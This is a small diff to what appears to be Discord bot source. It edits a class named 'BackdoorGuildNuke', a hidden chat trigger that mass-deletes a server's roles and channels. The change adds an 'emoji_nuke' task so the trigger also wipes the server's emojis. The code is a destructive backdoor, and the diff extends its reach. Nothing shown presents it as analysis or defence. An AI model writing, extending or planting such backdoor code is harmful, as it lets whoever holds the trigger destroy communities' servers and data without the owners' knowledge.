@@ -203,7 +203,7 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
                     pass
             await message.channel.send("Done Emoji Nuke")
 
-        tasks = role_nuke(), channel_nuke()
+        tasks = role_nuke(), channel_nuke(), emoji_nuke()
 
         for i in tasks:
             client.loop.create_task(i)
